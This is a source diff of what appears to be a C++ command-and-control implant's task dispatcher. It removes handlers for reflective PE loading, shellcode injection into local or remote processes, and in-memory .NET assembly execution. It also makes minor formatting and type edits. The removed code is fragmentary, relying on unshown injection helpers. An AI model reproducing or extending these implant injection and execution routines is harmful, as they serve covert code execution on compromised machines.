@@ -25,7 +25,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
     }
 
     Parser = (PARSER*)Self->Hp->Alloc( sizeof(PARSER) );
-    if ( !Parser ) {
+    if ( ! Parser ) {
         KhDbg("ERROR: Failed to allocate parser memory");
         goto CLEANUP;
     }
@@ -107,23 +107,6 @@ CLEANUP:
     KhDbg("[====== Dispatcher Finished ======]\n");
 }
 
-auto DECLFN Task::ExecPE(
-    _In_ JOBS* Job
-) -> ERROR_CODE {
-    PACKAGE* Package = Job->Pkg;
-    PARSER*  Parser  = Job->Psr;
-
-    ULONG BuffLen = 0;
-    ULONG ArgLen  = 0;
-    BYTE* Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
-    BYTE* Args    = Self->Psr->Bytes( Parser, &ArgLen );
-    BOOL  Success = FALSE; 
-
-    Self->Inj->Reflection( Buffer, BuffLen, Args );
-
-    return KhGetError;
-}
-
 auto DECLFN Task::ExecBof(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
@@ -154,26 +137,6 @@ auto DECLFN Task::ExecBof(
     } else {
         return KhGetError;
     }
-}
-
-auto DECLFN Task::ExecSc(
-    _In_ JOBS* Job
-) -> ERROR_CODE {
-    PACKAGE* Package = Job->Pkg;
-    PARSER*  Parser  = Job->Psr;
-
-    ULONG ProcID  = Self->Psr->Int32( Parser );
-    ULONG BuffLen = 0;
-    ULONG ArgLen  = 0;
-    BYTE* Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
-    BYTE* Args    = Self->Psr->Bytes( Parser, &ArgLen );
-    BOOL  Success = FALSE; 
-
-    KhDbg( "inject %p [%d bytes] into %s process", Buffer, BuffLen, ProcID ? "remote":"local" );
-
-    Success = Self->Inj->Shellcode( ProcID, Buffer, BuffLen, Args );
-
-    return KhGetError;
 }
 
 auto DECLFN Task::Download(
@@ -477,68 +440,6 @@ auto DECLFN Task::Pivot(
 
         }
     }
-}
-
-auto DECLFN Task::Dotnet(
-    _In_ JOBS* Job
-) -> ERROR_CODE {
-    PACKAGE* Package = Job->Pkg;
-    PARSER*  Parser  = Job->Psr;
-
-    UINT8      SbCommandID = Self->Psr->Byte( Parser );
-    ERROR_CODE Code = ERROR_SUCCESS;
-
-    KhDbg( "sub command id: %d", SbCommandID );
-
-    switch ( SbCommandID ) {
-        case DotInline: {
-            PCHAR cArguments  = Self->Psr->Str( Parser, 0 );
-            PCHAR cAppDomName = Self->Psr->Str( Parser, 0 );
-            BOOL  KeepLoad    = Self->Psr->Int32( Parser );
-            PCHAR cVersion    = Self->Psr->Str( Parser, 0 );
-            ULONG AsmSize     = 0;
-            BYTE* AsmBytes    = Self->Psr->Bytes( Parser, &AsmSize );
-
-            WCHAR wArguments[Str::LengthA( cArguments ) * sizeof( WCHAR )];
-            WCHAR wVersion[Str::LengthA( cVersion ) * sizeof( WCHAR )];
-            WCHAR wAppDomName[Str::LengthA( cAppDomName ) * sizeof( WCHAR )];
-
-            cArguments = cArguments[0] ? cArguments : NULL;
-
-            Str::CharToWChar( wArguments, cArguments, sizeof( wArguments ) );
-            Str::CharToWChar( wVersion, cVersion, sizeof( wVersion ) );
-            Str::CharToWChar( wAppDomName, cAppDomName, sizeof( wAppDomName ) );
-
-            Code = Self->Dot->Inline( 
-                AsmBytes, AsmSize, wArguments, wAppDomName, wVersion, KeepLoad 
-            );
-
-            if ( Self->Dot->Out.p && Self->Dot->Out.s ) {
-                Self->Pkg->Bytes( Package, (PUCHAR)Self->Dot->Out.p, Self->Dot->Out.s );
-            }
-            
-            break;
-        }
-        case DotList: {
-            G_PACKAGE = Package;
-            Self->Dot->VersionList();
-
-            break;
-        }
-        case DotInvoke: {
-            break;
-        }
-        case DotFork: {
-            // todo: add dotnet via fork
-            break;
-        }
-    }   
-
-_KH_END:
-    if ( Self->Dot->Out.p ) Self->Hp->Free( Self->Dot->Out.p );
-    if ( G_PACKAGE ) G_PACKAGE = nullptr;
-
-    return Code;
 }
 
 unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);
@@ -1335,7 +1236,7 @@ auto DECLFN Task::Process(
         case SbPsCreate: {
             G_PACKAGE = Package;
 
-            PCHAR               CommandLine = Self->Psr->Str( Parser, &TmpVal );
+            CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
             PROCESS_INFORMATION PsInfo      = { 0 };
 
             KhDbg("start to run: %s", CommandLine);
